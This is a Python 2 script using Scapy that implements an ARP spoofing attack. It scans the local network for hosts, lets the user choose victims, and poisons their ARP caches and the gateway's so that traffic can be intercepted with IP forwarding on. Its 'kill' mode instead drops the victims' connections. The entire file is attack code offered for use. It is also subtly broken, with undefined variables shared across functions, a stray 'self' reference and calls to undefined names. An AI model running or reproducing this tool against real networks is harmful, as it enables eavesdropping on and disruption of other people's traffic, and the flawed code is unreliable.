
import logging
import time
import os
import sys
import atexit
import re
import warnings

warnings.filterwarnings( "ignore", category = DeprecationWarning )
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

def bit_count(n):
    bits = 0
    while n:
      bits += n & 1
      n   >>= 1
    return bits

def set_forwarding(status):
    if not os.path.exists( '/proc/sys/net/ipv4/ip_forward' ):
        raise Exception( "'/proc/sys/net/ipv4/ip_forward' not found, this is not a compatible operating system." )
      
    fd = open( '/proc/sys/net/ipv4/ip_forward', 'w+' )
    fd.write( '1' if status == True else '0' )
    fd.close()
 

#find_alive_hosts
def alive_hosts():
	gateway_hw = None
	endpoints  = []
    
	print "[+] Looking for live network endpoints ..."

    # broadcast arping ftw
	ans,unans = srp( Ether( dst = "ff:ff:ff:ff:ff:ff" ) / ARP( pdst = network ), 
                     verbose = False, 
                     filter  = "arp and arp[7] = 2", 
                     timeout = 2, 
                     iface_hint = network )

	for snd,rcv in ans:
		if rcv.psrc == gateway:
			gateway_hw = rcv.hwsrc
		else:
			endpoints.append( ( rcv.hwsrc, rcv.psrc ) )
      
	if endpoints == [] and not all:
		raise Exception( "Could not find any live network endpoints." )


def dospoof(interface = conf.iface, gateway = None, network = None, kill = False, all = False ):
    conf.verb = 0

    interface    = interface
    network      = network
    targets      = [] 
    gateway      = gateway
    all          = all
    gateway_hw   = None
    packets      = []
    restore      = []
    endpoints    = []

    if not os.geteuid() == 0:
      raise Exception( "Only root can run this script." )
   
    print "@ Searching for the network gateway address ..."

    # for route in conf.route.routes:
    for net, msk, gw, iface, addr in conf.route.routes:
      # found a route for given interface
      if iface == interface:
        network = ltoa( net )
        # compute network representation if not yet done
        if network.split('.')[0] == addr.split('.')[0]:
          bits = bit_count( msk )
          network = "%s/%d" % ( network, bits )
        # search for a valid network gateway
        if gateway is None and gw != '0.0.0.0':
          gateway = gw
    
    if gateway is not None and network is not None:
      print "@ Gateway is %s on network %s ." % ( gateway, network )
    else:
      raise Exception( "Could not find any network gateway." )

    alive_hosts()

    print "@ Please choose your target :"
    choice = None
    
    if all:
      targets = endpoints
    else:
      while choice is None:
        for i, item in enumerate( endpoints ):
          ( mac, ip ) = item
          print "  [%d] %s %s %s" % ( i, mac, ip, )
        choice = raw_input( "@ Choose [0-%d] (* to select all, r to refresh): " % (len(endpoints) - 1) )
        try:
          choice = choice.strip()
          if choice == '*':
            targets = endpoints
          elif choice.lower() == 'r':
            choice = None
            alive_hosts()
          else:
            targets.append( endpoints[ int(choice) ] )
        except Exception as e:
          print "@ Invalid choice!"
          choice = None

    self.craft_packets()
      
    if not kill:
      print "@ Enabling ipv4 forwarding system wide ..."
      set_forwarding( True )
    else:
      print "@ Disabling ipv4 forwarding system wide to kill target connections ..."
      set_forwarding( False )
    
    atexit.register( restore_cache )

def craft_packets():
	for target in targets:
		packets.append( Ether( dst = gateway_hw ) / ARP( op = "who-has", psrc = target[1],    pdst = gateway ) )
		packets.append( Ether( dst = target[0] )       / ARP( op = "who-has", psrc = gateway, pdst = target[1] ) )
        # and packets to restore the cache later
		restore.append( Ether( src = target[0],       dst = gateway_hw ) / ARP( op = "who-has", psrc = target[1],    pdst = gateway ) )
		restore.append( Ether( src = gateway_hw, dst = target[0] )       / ARP( op = "who-has", psrc = gateway, pdst = target[1] ) )
    
def restore_cache():
	os.write( 1, "\n@ Restoring ARP cache " )
	for i in range(5):
		for packet in restore:
			sendp( packet, iface_hint = gateway )
		os.write( 1, '.' )
        time.sleep(1)
	os.write( 1, "\n" )

	set_forwarding(False)
    
def spoof():
	if all and targets != endpoints:
		targets = endpoints
		craft_packets()

	for packet in packets:
		sendp( packet, iface_hint = gateway )


## Runs actual script
def arpspoof():
	dospoof()
  
	if not kill:
		os.write(1, "[+] Spoofing! Open tcpdump to view network traffic")
	else:
		os.write(1, "[!] Killing target connections... ")

	slept = 0
	while 1:
		spoof()
		os.write( 1, '.' )
		time.sleep(5)
		slept += 1

	if o.all and slept > 10:
		restore_cache()
		find_alive_hosts()
		slept = 0

arpspoof()
